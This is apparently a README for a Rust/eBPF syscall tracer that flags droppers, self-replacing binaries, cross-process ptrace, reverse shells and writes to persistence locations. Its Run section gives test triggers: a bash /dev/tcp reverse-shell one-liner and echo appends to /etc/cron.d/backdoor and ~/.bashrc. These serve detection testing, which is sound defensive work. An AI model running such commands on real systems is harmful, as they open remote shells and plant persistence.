# eBPF Syscall Tracer

A Linux tool that watches system calls in real time via eBPF and flags
suspicious patterns — a small, readable version of what an EDR agent does at
the kernel boundary.

## Status

Core detection set complete. Five probes feed the ring buffer (`sys_enter_execve`,
`sys_enter_openat` filtered to `O_CREAT`, both `sys_enter_unlinkat` and the
legacy `sys_enter_unlink` — glibc's `unlink()` doesn't consistently route
through `unlinkat()` the way `open()` routes through `openat()`, so both are
traced — and `sys_enter_ptrace` filtered to `PTRACE_ATTACH`/`PTRACE_SEIZE`).
Five detection rules are live, all verified against real triggers:

- **dropper pattern** — a path opened for creation, then execve'd by the
  same pid within a short window.
- **self-replace** — a process unlinking the on-disk path it's currently
  running as, then re-exec'ing that same path within a short window.
- **cross-process ptrace** — a `PTRACE_ATTACH`/`PTRACE_SEIZE` where the
  tracer isn't the target's parent (checked via `/proc/<pid>/status`'s
  `PPid`, not kernel task-struct walking, to keep the eBPF side tiny). If
  ancestry can't be resolved at all, it fails secure — treated as unrelated
  rather than silently ignored.
- **reverse-shell shape** — a shell binary (`sh`, `bash`, `dash`, `zsh`, ...)
  exec'd with a socket already on fd 0 or fd 1. No new probe needed: a
  reverse shell `dup2()`s its socket onto stdin/stdout *before* calling
  `execve`, and those fds persist across the exec, so this reuses the
  existing exec events and checks `/proc/<pid>/fd/{0,1}` right after.
- **persistence writes** — a creating write into a known persistence
  location: cron dirs (`/etc/cron.*/`, `/etc/crontab`, `/var/spool/cron/`),
  systemd unit paths (`/etc/systemd/system/`, `/usr/lib/systemd/system/`,
  per-user `~/.config/systemd/user/`), or shell rc files (`.bashrc`,
  `.zshrc`, `/etc/profile`, `/etc/profile.d/*.sh`, ...). Also no new probe —
  pure path classification on the existing write events.

**Known limitations:**

- Persistence writes only fire on the existing `O_CREAT`-filtered write
  probe. In practice most real edits still pass `O_CREAT` (shell `>>`
  append, `sed -i`, `crontab -e`'s temp-file-then-rename, most editors), so
  this covers the common case, but a write that opens an existing rc file
  with plain `O_WRONLY`/`O_TRUNC` (no `O_CREAT`) is invisible to this tracer.
  A dedicated probe watching those specific paths regardless of flags would
  close the gap; out of scope for this MVP.
- Self-replace tracks "what binary is this pid running" purely from the path
  argument of the most recent `execve` syscall. That's wrong for
  `#!/usr/bin/env <interpreter>`-shebang'd scripts: `env` does its own
  `$PATH` search as separate, real `execve` syscalls after the kernel's
  shebang resolution, so the tracked path ends up being the last `$PATH`
  candidate `env` tried (e.g. `/usr/bin/python3`), not the original script
  path — and the self-unlink of the script never matches. A direct
  interpreter shebang (`#!/usr/bin/python3`, no `env`) or a compiled binary
  doesn't hit this. Real EDR tools resolve this with argv-aware correlation;
  out of scope for this MVP.

All five detections from the original brief are implemented.

## Architecture

```
kernel space                 user space
────────────                 ──────────
eBPF programs                 loader + reader (Rust, aya)
  attached to tracepoints  →  ring buffer  →  event decoder
  (sys_enter_execve, etc.)                      │
  emit compact events                           ▼
                                            detection rules
                                            (stateful, per-pid)
                                                 │
                                                 ▼
                                            TUI / JSON log
```

- `syscall-tracer-ebpf` — the in-kernel programs. Kept tiny: read, filter,
  emit. No analysis happens here.
- `syscall-tracer-common` — the `#[repr(C)]` `TraceEvent` type (tagged
  exec/write/unlink/ptrace) shared, byte-for-byte, between kernel and
  userspace. (Reverse-shell needs no new event kind — it reuses `Exec`.)
- `syscall-tracer` — loads the eBPF object, attaches programs, drains the
  ring buffer, and hosts the stateful detection layer (`src/detection/`, one
  module per rule), keyed by pid and tested independent of the kernel/eBPF
  plumbing.

## Build

Requires a nightly Rust toolchain (for the `bpfel-unknown-none` /
`bpfeb-unknown-none` no_std targets, built from source via `-Z
build-std=core`) plus [`bpf-linker`](https://github.com/aya-rs/bpf-linker).
`rustup target add` does **not** work for these targets — they're tier 3 with
no prebuilt `core`; the `rust-src` component is enough.

```sh
rustup toolchain install nightly --component rust-src
cargo install bpf-linker

cargo build
```

## Run

Attaching a tracepoint program requires root — but run plain `cargo run`,
**not** `sudo cargo run`. `.cargo/config.toml` sets the runner to `sudo -E`,
so cargo builds unprivileged (needed: your regular user's rustup toolchain,
not root's, which likely doesn't have the nightly + rust-src setup at all)
and only escalates for the final step of executing the compiled tracer,
prompting for your password at that point:

```sh
cargo run
```

Running `sudo cargo run` instead puts the *entire* build under root's
environment, which typically doesn't have rustup/nightly installed and falls
back to the system toolchain — producing `can't find crate for core` when it
tries to cross-compile the eBPF object. If you hit that error, it means
`sudo` was applied one level too high.

Trigger some execve calls in another shell and watch the event stream:

```
KIND   PID      UID COMM             PATH
WRITE  4213     1000 tee              /tmp/payload
EXEC   4213     1000 tee              /tmp/payload
[ALERT] dropper pattern: pid=4213 uid=1000 wrote then exec'd /tmp/payload (12ms later)
```

Self-replace requires a process that unlinks the exact path it's currently
running as, then re-execs that same path — not something an interactive
shell reproduces naturally, since each external command is a fresh
fork+exec. A single process doing it to itself (no fork) is the real shape
(and, per the limitation above, avoid an `env`-based shebang for a script
payload):

```
UNLINK 4310     1000 agent            /opt/agent
EXEC   4310     1000 agent            /opt/agent
[ALERT] self-replace: pid=4310 uid=1000 unlinked then re-exec'd /opt/agent (8ms later)
```

Cross-process ptrace needs a `PTRACE_ATTACH`/`PTRACE_SEIZE` where the tracer
isn't the target's parent — e.g. attach to an unrelated already-running
process (root or matching uid; the target must not already be traced):

```
PTRACE 5120     1000 python3          target_pid=4980
[ALERT] cross-process ptrace: pid=5120 uid=1000 attached to unrelated pid 4980
```

Reverse-shell needs a shell exec'd with a socket already on stdin or stdout
— redirect a shell onto a raw TCP connection (e.g. the classic
`bash -i >& /dev/tcp/host/port 0>&1`, against a listener you control):

```
EXEC   5401     1000 bash             /bin/bash
[ALERT] reverse shell: pid=5401 uid=1000 /bin/bash has a socket on stdin/stdout
```

Persistence writes just need a creating write into a watched path, e.g.
`echo "* * * * * evil" >> /etc/cron.d/backdoor` or `echo evil >> ~/.bashrc`:

```
WRITE  5502     0    bash             /etc/cron.d/backdoor
[ALERT] persistence write (cron): pid=5502 uid=0 wrote /etc/cron.d/backdoor
```

Run the unit tests for the detection logic (pure state-machine code, no
kernel/root needed):

```sh
cargo test -p syscall-tracer
```

## Roadmap

- Live terminal view plus a JSON event log for later review.
